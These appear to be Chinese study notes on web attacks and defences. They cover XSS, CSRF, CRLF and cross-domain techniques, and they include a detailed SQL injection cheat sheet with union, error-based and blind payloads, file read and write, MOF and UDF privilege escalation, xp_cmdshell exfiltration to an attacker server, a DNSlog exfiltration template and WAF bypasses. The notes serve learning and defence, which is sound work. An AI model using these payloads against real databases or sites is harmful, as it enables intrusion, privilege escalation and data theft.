补：其他

发掘XSS漏洞

源代码审计

在使用一些全局变量的时候，接受http方法传送过来的参数，如果不加过滤，则会将恶意代码如xss带入（甚至可通过X-Forwarded-For变量）

DOM XSS

利用js可操控dom结构来写入XSS

Flash XSS

ActionScript + JavaScript

巧用语言特性

  • phpinfo（）函数，低版本的php对用户输入的变量不加转义就打印出来了
    例：

  • $_SERVER[‘PHP_SELF’]，其代表当前php文件相对于网站根目录的位置地址，但如果url为恶意的，那么恶意url会执行

  • 变量覆盖：register_globals=on指允许各种变量被重新注册、extract()用来将变量从数组导入到当前符号表中，如extract($_GET)为用此方法覆盖所有以GET方法获取的变量、foreach()函数 （具体没有理解，还需要进一步学习）

XSS WORM

Ajax介绍

运用DOM技术

遍历DOM 以及document.getElementByname 和document.getElementByTagName和document.getElementById
innerHTML方法可以向HTML DOM中插入新内容：this.innerHTML=’
’
运用DOM获取元素特性的值的方法有getAttribute和setAttribute
修改DOM使用createElement(),联合使用appendChild()或insertBefore()

深入XSS原理

深入浅出CSRF（跨站请求伪造）

盗用用户身份，发起恶意请求，形成原因即为采用了隐式身份验证（cookie）

防御：验证来源referer、使用验证码和加token等

Hacking JSON

JSON为JS子集，格式为名值对
JSON做对象的话用{}包裹键值对们，如果是做数组的话，用[]
JSON注入不甚了解，看书得出的结论为，JS在解析JSON时，如果JSON为恶意制作的，那么极有可能转化为javascript对象从而在浏览器中执行，对系统造成损害。
JSON Hijacking就是CSRF的另一种形式，书中也是这么讲。此即为通过恶意手段，获取用户访问正常页面时返回的JSON信息

HTTP Response Splitting

也称CRLF注射攻击，注射大致意味着， 在一个地方的输入框内，多输入代表其他部分信息的内容，同事不会被系统拦截或者拒绝，这就成功了。
CRLF == \r\n == 0x0D 0x0A == 13 10(ASCII码值) == 回车 换行 为http header中各项分隔的标志
利用的话 可以直接在url里加入%0D%0A%0D%0A后接js代码，这里的两个CRLF我猜想应该是分开http header 和body部分用的。

MHTML协议安全

MHTML是MIME HTML (Multipurpose Internet Mail Extension HTML，聚合超文本标记语言)的缩写，是由RFC 2557定义的把一个多媒体的页面所有内容都保存到同一个文档解决方案。这个方案是由微软提出从IE5.0开始支持，另外Opera9.0也开始支持，Safari可以把文件保存为.mht（MHTML文件的后缀）格式，但不支持显示它。

实际mhtml文件（.mht文件）内容

真正访问的话，url的头部需要加入 mhtml：，尾部需要加上 ！文件名
攻击手法的话，用CRLF可以直接在url里面操作相当于注入数据包吧，把mhtml格式的东西写进去，js恶意代码记得用自己规定的编码方式去编码
防御很简单：参数长度限制， 还有CRLF的字符过滤

利用Data URIs 进行XSS剖析

与MHTML类似，但实际上是解决了将小文件嵌入到网页之中，和mhtml一样有着固定的格式，因此XSS也是要编码后放进去的（默认base64）例子如下
<a href=”data:text/html;base64,Jmx0O3NjcmlwdCZndDthbGVydCgiWFNTIikmbHQ7L3NjcmlwdCZndDs=”>test</a>
关于普通超链接和data uris 区别，以下为摘取自博客
https://blog.csdn.net/daruisoft/article/details/19773181
当我们需要减少访问网页产生的请求数时，Data URIs技术理应成为备选之举。
事物总是两面的，Data URIs能减少请求、减少小文件所消耗的带宽（不用再额外发送http头）；但是，我们也不能忽略Data URIs可能造成的缓存问题和编码时资源消耗的问题。

UTF-7 BOM XSS

利用的应该是前几章说过的用编码进行绕过，那么这里利用utf-7是因为IE是根据BOM判断编码字符集，而我们可以进行改动来控制其判断。

浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）

几个特殊场景

有谷歌把cookie显示出来的，有利用RSS中的XSS的，还有应用软件中的

浏览器差异

差异太多 记不住 无能为力

字符集编码隐患

这似乎和sqli里宽字节注入挺像的，宽字节可以绕过一些个转义的过滤

防御XSS攻击

XSS Filter

过滤输入输出、输出进行适当编码、黑名单和白名单

定制过滤策略

这里其实总结精练了一些绕过方法，有些后悔读了一半就开始写读书笔记了。具体讲啥 应该就是不知攻焉知防的道理？

Web安全编码规范

Html文本中使用html编码为好，js代码段使用转义来进行处理比较好，Url中还是url编码比较合适。

防御DOM-Based XSS

一方面是避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现
另一方面就是强化客户端js代码

其他防御方式

  • Anti_XSS库
  • HttpOnly Cokkie
  • Noscript 火狐一插件
  • 上WAF

    防御CSRF攻击

  • 使用POST替代GET（只能增加利用难度或者是发现难度）
  • 检验HTTP Referer
  • 验证码
  • 使用Token，本书讨论了token放这放那的问题，最后总结一次性Token最有效。

    四两拨千斤：HttpOnly

    为cookie的某一项 或者几项 或者全部 设置HttpOnly使得js代码无法读取指定cookie值

输入输出时进行检查，编码输出

注意要在正确的地方使用正确的编码方式
如html encode，如果用户输入为html encode格式，在浏览器中html parser优先于js parser执行，因此先html解析再js代码执行，这个时候用户的输入在js运行前 已经被解析回js代码，所以一开始用户可以构造好parload再html编码之后进行攻击

正确防御XSS

要想要根治XSS，可以列出所有XSS可能发生的场景（用户输入出现的位置），再一一解决

  • 在HTML标签中输出

    攻击方式是构造<script>标签或者任何能够产生脚本执行的方式
防御方法是对变量使用HtmlEncode

  • 在HTML属性中输出

    利用和防御方法同上

  • 在<script>标签中输出

    攻击者需要注意闭合单、双引号
防御使用JavascriptEncode

  • 在CSS中输出

    一般来说这样是禁止的，但是如果需要，推荐使用OWASP ESAPI中的encodeForCss（）函数
例：String safe=ESAPI.encoder().encoderForCSS(request.getParameter("input"));
其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制性时"\uHH"
【ESAPI (OWASP企业安全应用程序接口)是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序。ESAPI接口库被设计来使程序员能够更容易的在现有的程序中引入安全因素。ESAPI库也可以成为作为新程序开发的基础。】

  • 在地址中输出

    一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可
但urlencode不要用在Protocol（协议）和Host（域名或主机名）部分，会改变语义
攻击者就可以使用伪协议，如javascript、vbscript、dataURI等
防御即为检查uri开头是否为http，不是则进行urlencode
OWASP ESAPI中有encodeForURL（）函数，例：
String safe=ESAPI.encoder().encoderForURL(request.getParameter("input"));

  • DOM Based XSS的防御

    一般只会注意到在<script>标签中输出必须过滤（编码）一次的情况，但是也要注意往往在使用document.write()等将内容输出到html页面的方法前，需要针对前几种情况做出对应的编码，防止在这一输出过程中输出XSS代码

五种客户端跨域方法：

JSONP(json with padding)

用callback参数传递数据，请求的相应页面也要有相关的响应数据

document.domain

其会显示当前域名，也可以人为设置，但只能设置成当前域名或者顶级域名。设置成相同域名即可进行原本不同域页面的操作了，也就是可以跨域读取之类了

window.name

无论页面内容怎么跳转，windows.name是不变的，所以用于在跨域时承载数据，一般用来缩短xss的payload。想要跨域访问元素可以直接改变相应元素的src属性使得看起来是一个域，然后运行window.name里面的payload

postMessage

是HTML5时代新出现的api，发送方通过postMessage方法传递自定义消息给指定接收的域；接收方通过事件监听可以获取传过来的消息

browser SOP bug

即各种浏览器解析sop(Same-Origin Policy)同源协议时出现的漏洞

三种服务器跨域方法

反代服务器

即将其他域名的资源映射到自己的域名之下，这样浏览器就认为他们是同源的

CORS（Cross-origin resource sharing）

跨域资源共享，发送端通过发送带有头信息Origin字段的请求来获取服务端资源，如果许可，返回带有Access-Control-Allow-Origin等字段的回应，不被许可则返回错误。和websocket很像（发送时都带有origin字段用于服务器判断是否可跨域，但具体发送的字段和获取到的字段有差），信安之路之前的文章里面 作者晚风说和jsonp很像，只是多了个类似白名单的东西在控制

Flash

与flash相关配置有关

其他高端技巧

xss-without-parentheses-and-semi-colons
无需括号与分号的XSS
绕过WAF的XSS检测机制
Xss小游戏通关秘籍

entry.title: SQLI SUMMARY
entry.content:
MYSQL注入引入

手工注入步骤

  • 判断是否存在注入,注入是字符型还是数字型
    在输入处输入 1（测试数字型注入）、1’（测试字符型注入）、1” （测试字符型注入） 再拼接and 1=1或or 1=1等永真式来测试,如果哪种情况下页面出现不同的显示则说明存在相应情况注入

  • 猜解SQL查询语句中的字段数
    需要用到order by来逐个测试字段数,在前一阶段基础上构造如1’ order by 1 #、1’ order by 2 #、 1’ order by 3 #…,常用二分法来猜解,这里的#代表着注释符

  • 确定显示的字段顺序
    类似前一步骤,可构造如 1’ union select 1,2,… #用到的知识是union联合查询需要前后两个查询语句取出的列数相同

  • 获取当前数据库
    输入类似 1’ union select 1,database() # 进行查询

  • 获取数据库中的表
    使用类似 xx’ union select 1,table_name from information_schema.tables where table_schema=’数据库名’– ,此处–也是注释符

  • 获取表中的字段名
    输入类似 xx’ union select 1,column_name from information_schema.columns where table_name=’表名’–

  • 下载数据
    xx’ union select 字段名 from 表名 –

内置四个数据库介绍

Mysql数据库自带四个数据库的解析

information_schema库是注入查询信息时用的比较多的

查询数据的几个重要语句

查库select schema_name from information_schema.schemata
查表select table_name from information_schema.tables where table_schema=库名
查列select column_name from information_schema.columns where table_name=表名
一般select 列名 from 库名.表名

将当前查询语句爆出来：

可一次性爆出所有库、表、列名的注入向量

一些函数介绍

  • limit 偏移量,数量
    如果某些页面只能返回特定个数或行数的数据时,可用limit做限制,如limit 0,1、limit 1,1等,例select schema_name from information_schema.schemata limit 0,1
  • concat（）：没有分割符的连接字符串
    concat_ws():含有分隔符的连接字符串
    例concat_ws(‘-‘,username,password) 为用”-“分隔username字段和password字段,但返回的还是多行数据
  • group_concat():连接一个组的所有字符串,并以逗号分割每一条数据
    group_concat(xxxx)或者group_concat(username,’-‘,password),后者组内字段用”-“分隔,但是得到的数据都是一行

利用and exist（查询语句）来进行判断
Mssql重要的表：sysobjects
Mysql注入：
System_user() 系统用户名
User（）用户名
Current_user() 当前用户名
Session_user() 链接数据库的用户名
Database（）数据库库名
Version() mysql数据库版本信息
Load_file() 转换成16或10进制 读取本地文件
@@datadir读取数据库路径
@@basedir mysql安装路径
@@version_compile_os() 操作系统

报错注入方式

适用于不回显内容,但是显示报错的情况。这个时候要构造payload使得想要的数据随着报错信息回显出来
以下给出三个函数使用的模板,查询语句处可替换成需要的语句

  • floor()：select count() from information_schema.tables group by concat((查询语句),floor(rand(0)2)); group 对rand 函数进行操作时产生错误。

  • extractvalue() :extractvalue(1,concat(0x7e,(查询语句),0x7e) ;

    XPATH语法错误产生报错。

  • updatexml() :select updatexml(1,concat(0x7e,(查询语句),1);

    XPATH语法错误产生报错。

手工盲注的步骤

盲注即无法获得注入语句的执行结果

  • 判断是否存在注入,注入是字符型还是数字型
    布尔盲注：若回显的信息是以真假区分,要不回显真（或账号存在）,要不回显假（账号不存在）,那可以在代码中插入布尔型语句,方法类似最前面手工注入的部分所讲
    时间盲注：若我们是根据页面反应是否延时来猜解判断,可以用一些延时函数,或者需要花费大量时间去运行的函数,来进行猜解

  • 猜解当前数据库名
    根据长度和各位字符的ASCII码值,通过函数获取到,与数字相比较,运用二分法来得到准确数值进行推断。具体请看之后的相关函数介绍和实例

  • 猜解数据库中的表名
    先猜解表数,然后猜解各个表名长度与各位字符

  • 猜解表中的字段名
    先猜解字段名,然后是字段名长度和其值

  • 猜解数据
    与之前的类似

布尔盲注相关函数介绍

  • length(str)
    获取字符串长度,这里可构造类似1’ and length(database())>1— 再应用二分法来判断数据库名称长度,抑或是表和字段的长度
  • left(a,b)
    从左侧开始截取a字符串的前b位
  • substr(expression,start,length)
    选取表达式的start位起length长度的子串
  • ascii（a）
    将某个字符转换为ascii值
  • mid()函数
    与substr函数功能一样
  • ord()函数
    与ascii函数功能一样
  • regexp
    { （select user()) regexp ‘^r)正则表达式用法,user（）结果为root,regexp为匹配root的正则表达式}
  • like
    { (select user()) like ‘ro%’} 与regexp类似,使用like进行匹配。

常用POC

猜解数据库名举例,猜解第一个字符

猜解数据库中表数量

猜解表长度

最后猜解具体的表名,一位一位的拆解,字段名同理可得

时间盲注相关函数介绍

  • sleep(N)函数
    休眠N秒,这里常应用到if函数
  • if(expr1,expr2,expr3)
    如果expr1为真,返回expr2,否则返回expr3
    前两者结合起来可对数据库库名表名之类的进行猜解,例：
    1’ and sleep(if(length(database())=4,5,0))—
  • benchmark(count,expr)
    将expr表达式执行count次

将文件写入磁盘文件的方法

SQL注入读写文件的根本条件：

  • 数据库允许导入导出（secure_file_priv）参数填允许操作的目录
  • 当前用户用户文件操作权限（File_priv）

load_file()读文件 into outfile / into dumpfile写文件 条件：

  • 对web目录具有读写权限
  • 知道文件绝对路径
  • 能够使用联合查询（sql注入时）

读取系统文件的方法

MYSQL提权

MOF

Mof提权（托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。在 MOF 文件中创建类实例和类定义后,可以对该文件进行编译。）
在找到上传点后,上传可创建用户的mof文件,之后利用mysql写入文件

或

效果就是添加一个用户admin密码admin;
管理组

现在默认它还是会过5s添加一次用户,解决方法就是:
第一 net stop winmgmt 停止服务,
第二 删除文件夹：C:\WINDOWS\system32\wbem\Repository\
第三 net start winmgmt 启动服务

之后3389连接即可,记得创建用户后需要提升至管理员权限

UDF

可使用UDF(User-Defined Functions)用户自定义函数,需先上传lib_mysqludf_sys.so,之后可以执行sys_eval()、sys_exec()、sys_get()、sys_set()
Oracle、ms sql server中有存储过程（procedure）类似UDF,臭名昭著的xp_cmdshell等,如果其被禁用,可以在拥有相应权限的时候开启
存储过程之中也会存在注入,这个也需要注意

Mysql udf提权,需要先上传自己的udf.dll文件

MYSQL5.1及之后的几个版本又多了一个限制：创建函数时所用的DLL只能放在mysql的plugin目录里面,而且这个plugin目录默认是不存在的,可能就是为了防止黑客通过导出文件的方式将DLL来写到这个文件夹,如果导出文件（into dumpfile）的目标目录不存在是会报错的。
这时就需要我们把 udf.dll 导出到 lib\plugin 目录下才可以,利用 NTFS ADS 流来创建文件夹

执行成功以后再进行导出即可。

补充阅读

Access注入

Access偏移注入

指的是知道表名不知道列名时,计算想要获取的信息 所在表的字段数
在知道当前注入的表的长度之后,使用类似union select 1,2,3,4,5,6, from admin的方法,在页面正常返回的时候,用order by获取的显示的字段数减去前面的列数,得到代表的列数,这就是admin表的列数,由此可见当admin表中列数少于当前注入表的时候,偏移注入是能成功的,否则则不可以
之后使用偏移注入例：

还有一种方法叫移位溢注,不使用上面一行的表自连接,而是直接用table.*来代替,其实都受限于目标表列数一定要小于当前注入表的列数

SQL Server 注入

一篇文章由浅入深了解MSSQL注入

常用查询

查询库名

获取数据库中所有表

获取所有字段名

常用内置函数

db_name（）–当前库名
user（）–当前用户名
suser_name（）–登陆用户名

实现mysql中的limit m,n

limit 7,3

关于xp_cmdshell

此时，我们已经可以执行系统命令，并向我们控制的Wbe服务器发出HTPP/s请求。综合以上两点，我们就可以通过https://redteam/[information_code]来获取信息。
在这种情况下，我们选择Bsae64编码而不是十六进制，因为我们需要数据库允许我们以更少的字符存储更多的信息。

我们应该遵循以下几点:

  • 声明一个“表”类型的变量，让返回的结果保存在存储过程xp_cmdshell中(记住，返回的结果是多行的)。
  • 将命令的输出结果存储到上一个变量中。
  • 连接“表”的SQL语句，用换行符分割。
  • 将生成的字符串编码为Base64，并将其保存在一个变量中。
  • 生成certutil命令，将字符串添加到结果中。
  • 执行
    在T-SQL中没有办法直接执行第三步和第四步，但有两个小技巧来解决这个问题:

无法使用MySQL的group_concat函数，因此所有字符串的连接都使用FOR XML子句。这样，就可以以单个字符串(XML)的形式获取数据。

另一方面，也没有方法直接将字符串转换为Base64，但可以将Base64转换成二进制数据。因此，解决方案是将之前的字符串转换成二进制数据:

实现这一编码，还有其他的选择，比如使用XQuery。

将所有的步骤放在一起就会发现和T-SQL十分的相似:

在读取包含命令结果的表的过程中，我们需要考虑到排序规则。

防御方法:修复sql注入漏洞、删除xplog70.dll

利用数据类型转换报错注入

Tricks

补充阅读

使用DNSlog

首先介绍一个免费的dnslog平台,注册后可获取域名,并能看到dns query信息：http://ceye.io
会被提供一个二级域名xxx.ceye.io,只要将信息放到三级域名那里就可以收到消息了
语句模板为：select load_file(concat(‘\\‘ , 完整的查询语句 , ‘.xxx.ceye.io\abc’)) 最好记下
这个时候,登陆上述dnslog平台,得到dns query记录,里面记录有 查询结果.xxx.ceye.io格式的记录
但是使用load_file函数是需要些权限的,一般需要root权限,除此之外
执行show variables like ‘%secure%’; 得到的secure_file_priv这一项的值为空时表示可以读取磁盘目录;如为G:\即可读取G盘的文件;如为null则表示不能加载文件。可以通过修改my.ini来改变secure_file_priv的值
这个变量用于限制数据导入和导出操作造成的影响,例如由 LOAD DATA、SELECT…INTO OUTFILE 语句和 LOAD_FILE() 函数执行的操作。
1、如果变量设置为目录的名称,则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在,服务器不会自己创建它。
2、如果变量为空,则不会产生影响,引起不安全的配置。
3、如果变量设置为 NULL,那么服务器就会禁用导入和导出操作。这个值从 MySQL 5.5.53 版本开始允许。
在 MySQL 5.5.53 之前,此变量默认为空,因此我们就可以使用这些函数。但是在 5.5.53 之后的版本中,NULL 值会禁用这些功能。(根据两台测试机器不同版本的 mysql 来判断,会默认为 mysql 的一个 /upload 根目录下)

一些可用 payload

windows:

SQL Server:

Oracle:

MySQL:

PostgreSQL:

XML Entity Injection

Struts2

FFMpeg

Weblogic

ImageMagick

Resin

Discuz

宽字节注入

宽字节即多个字节表示的字符
php中就有addslashes等函数来防范sql注入,即在每个单双引号和反斜杠,以及值NULL的前面,加上一个反斜杠,这样可以防止单双引号的提前闭合等
如果mysql用gbk作为编码方式,两个字符算作一个汉字,而前一个字符的ASCII码值要大于128,才到汉字的范围
经常使用%df来进行宽字节注入,如1%df’ and 1=1
这样最终的查询语句会变成select * from xxx where id=’1運’and 1=1
不只是%df,还可以是%a1、%aa等,只要ASCII码大于128
但是如果编码变化,如果为gb2312,则方法也不同,因为gb2312编码中对高低位字节ASCII码值要求不同,而\的ascii码不在低位范围中,所以需要换个方法

而在防止sql注入的时候,一定要注意编码转换的过程中,会出现疏漏导致引号逃逸
可以将addslashes函数替换为mysql_real_escape_string,此时需要将php与mysql连接的编码方式,以及mysql中编码方式统一为gbk才可有效
还可以在所有sql语句前指定一下连接的形式是二进制：
mysql_query(“SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary”, $conn);
当我们的mysql接受到客户端的数据后,会认为他的编码是character_set_client,然后会将之将换成character_set_connection的编码,然后进入具体表和字段后,再转换成字段对应的编码。
然后,当查询结果产生后,会从表和字段的编码,转换成character_set_results编码,返回给客户端。
所以,我们将character_set_client设置成binary,就不存在宽字节或多字节的问题了,所有数据以二进制的形式传递,就能有效避免宽字符注入。
以上多参考于https://www.cnblogs.com/lcamry/articles/5625276.html

而在某些情况,网站服务端选择使用二次编码,如对url在客户端两次url编码,之后服务端也两次url解码,可是过滤的函数使用次序不当,就会产生疏漏
例：将%2527送至服务端,先进性一次url解码成%27（%25url解码后为%）,这个时候使用过滤函数没有问题,但是这之后再url解码成 ‘ 如果直接带入sql查询语句,不做过滤,就会出现注入漏洞

还有二次注入,指的是服务端虽然对接受的数据进行了转义等的处理,但还是能将构造好的脏数据存放到表内。而服务端通常对数据库中的内容在使用的时候不加过滤和转义,这个时候拼接入sql语句就会产生注入漏洞

一些绕过的方法

  • 大小写混用
  • 代码变形
  • 编码
  • 使用sql注释代替空格/**/
  • 多行注释（/**/）
  • 单行注释（#,//,–）
  • 换行（%0A,\u2028,%E2%80%A8）
  • 数据库特征
  • %00截断
  • 畸形请求

使用空字符,url编码后为%00来绕过输入过滤器,因为会在遇到空字符时停止
根据具体情况利用长度截断,去掉过滤器加上的转义字符等
一般会过滤–和–%20（空格）,可以使用–%a0（换行符）,即换行符%a0可用来替代空格%20。
/ …. \/ 在大部分语言中都一样是注释。这个之中的语句是不被执行的。但MYSQL中 为了保持兼容,比如从mysqldump 导出的SQL语句能被其它数据库直接使用,它把一些特有的仅在MYSQL上的语句放在 /! … / 中,这样这些语句如果在其它数据库中是不会被执行,但在MYSQL中它会执行。
还有这种形式：/_//!50000Order/
联合查询的时候,查询填充的列分割较多时,就会被waf拦截。可使用Join查询,payload构造为：

也可在列名前加”~”、”.”、单引号和双引号,或者使用字符9e0
%A0或者/!50000/还有9e0都常用
没有说明9e0和e0绕过原理,这里补充一下9e0和前面的id=123’和起来,后台查询语句可能就变成了select from article where id=’123’9e0;而在mysql中9e0表示9乘10的0次方,所以mysql会把上面字符串123强制转换成数值123再乘9,语句也就变成了select * from article where id=’1107’;

  • WAF绕过技巧
    1.利用()代替空格
    2.利用mysql特性/*!*/执行语句
    3.利用/**/混淆代码
    要注意的点有
    1.mysql关键字中是不能插入/**/的，即se/**/lect是会报错的，但是函数名和括号之间是可以加上/**/的,像database/**/()这样的代码是可以执行的
    2./*!*/中间的代码是可以执行的，其中50010为mysql版本号，只要mysql大于这个版本就会执行里面的代码
    3.数据或者函数周围可以无限嵌套()
    4.利用好%00

  • php和mysql过滤与绕过
    过滤and和or时,将and、or改为&&、||
    过滤union时,将union select xxx改为1 or （select xxx）
    过滤where时,将where替换成limit 1等
    也过滤limit,可以使用group by xxx having xxxx
    若再过滤group by,使用select substr（group_concat（user_id）,1,1） user from users来替换select user from users group by user_id having user_id = 1
    再过滤select,则使用substr（user,1,1）
    若过滤单引号,则将字符进行ascii编码或者hex编码
    若过滤hex（）函数,则用conv（）函数代替,例lower(conv(11,10,36))
    MySQL数字的进制转换(conv的使用)
    CONV(N,from_base,to_base)
    若过滤substr,用lpad字符代替,LPAD(str,len,padstr)
    返回字符串str,左填充用字符串padstr填补到len字符长度。 如果str为大于len长,返回值被缩短至len个字符(即,不能超过 len 长)。
    若过滤空白字符,可以使用%0b来代替空格,此法也可代替/**/来用

判断数据库类型的方法

Mssql中内置变量
@@version 数据库服务器版本
@@servername 安装sql server的服务器名称
@@language 当前使用语言的名称
@@spid 当前用户的进程id
获取详细信息：
SELECT SERVERPROPERTY(‘productversion’)
SELECT SERVERPROPERTY(‘productlevel’)
SELECT SERVERPROPERTY(‘edition’)
EXEC master..msver

根据判断版本时使用的函数和返回的信息判断
Mssql: select @@version
Mysql: select version() , select @@version
Oracle: select banner from v$version , select banner from v$version where rownum=1
PostgreSQL: select version()

根据字符类型拼接方式判断
Mssql: select ‘some’ + ‘string’
Mysql: select ‘some’ ‘string’ , select concat(‘some’,’string’ )
Oracle: select ‘some’ || ‘string’ , select concat(‘some’,’string’ )
PostgreSQL: select ‘some’ || ‘string’ , select concat(‘some’,’string’ )

根据数字函数判断（在特定数据库中返回数字,在其他数据库中产生错误）
Mssql: @@pack_received , @@rowcount
Mysql: connection_id() , last_insert_id() , row_count()
Oracle: bitand(1,1)
PostgreSQL: select extract (dow from now() )

根据插入单引号后产生的报错,以及union查询产生的报错等,也可以推测数据库类型

条件语句
Mssql: if (a’a=’a’) select 1 else select 2
Mysql: select if(‘a’,1,2)
Oracle: 4select case when ‘a’=’a’ then 1 else 2
End from dual
Select decode(substr(user,1,1) , ‘A’,1,2 ) from dual
PostgreSQL: select case when (1=1) then ‘a’ else ‘b’ end

防御SQL注入

使用预编译语句,如java中的PrepareStatement,php中绑定变量的方法
使用 安全的存储过程
检查数据类型
使用安全函数（编码函数如OWASP ESAPI中的实现）

其他

SQL Column Trunctation攻击方式,例如当用户插入超长值时只有warning（真实结果为插入）而非error（即结果为不插入）,会插入相应截断后的数据

当数据库显示报错信息的时候,比如需要输入整数的地方,我们输入0/@@version,在报错的时候,会把版本信息一起显示出来(MS SQL Server中)

多语句,堆叠注入
Select from a where id = 1;select from flag;
Sql server中为Select from a where id = 1 select from flag;
对于php-mysql来说,通过PDO_MYSQL和MYSQLi方式与数据库交互地可以使用堆叠注入,但通过mysql_query进行交互的不可以

根据数字数据判断注入点
若原始值时2,使用3-1或者1+1注入看结果,或者使用67-ASCII（’A’）或51-ASCII（1）,如果相同则存在注入
51-ASCII（1）应用在过滤单引号的情况下,数据库会隐含的将数字数据转化为字符串数据,字符1的ascii值为49,所以 表达式等于2
